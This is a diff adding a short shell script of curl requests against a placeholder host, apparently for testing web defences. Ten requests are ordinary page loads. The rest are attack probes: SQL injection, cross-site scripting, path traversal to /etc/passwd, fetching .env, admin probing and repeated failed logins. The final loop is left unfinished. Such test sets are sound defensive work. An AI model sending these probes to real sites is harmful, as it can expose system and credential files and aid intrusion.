@@ -1,0 +1,20 @@
+curl -i http://TARGET/
+curl -i http://TARGET/login
+curl -i -X POST http://TARGET/login \  -d "username=duy&password=DemoPass123"
+curl -i http://TARGET/products
+curl -i http://TARGET/products/101
+curl -i http://TARGET/about
+curl -i http://TARGET/contact
+curl -i -X POST http://TARGET/contact/submit \  -d "name=Duy&message=Hello"
+curl -i http://TARGET/assets/style.css
+curl -i http://TARGET/favicon.ico
+curl -i --get --data-urlencode "q=' OR '1'='1" \  http://TARGET/search
+curl -i --get --data-urlencode \  "id=1 UNION SELECT NULL" http://TARGET/product
+curl -i --get --data-urlencode \  "q=<script>alert(1)</script>" http://TARGET/search
+curl -i --get --data-urlencode \  "url=javascript:alert(1)" http://TARGET/redirect
+curl -i --path-as-is \  http://TARGET/../../etc/passwd
+curl -i http://TARGET/.env
+curl -i http://TARGET/wp-login.php
+curl -i http://TARGET/admin
+curl -i --path-as-is \  http://TARGET/cgi-bin/.%2e/.%2e/etc/passwd
+for i in {1..5}; do  curl -s -o /dev/null -X POST \    http://TARGET/login \    -d "username=admin&password=wrong$i"
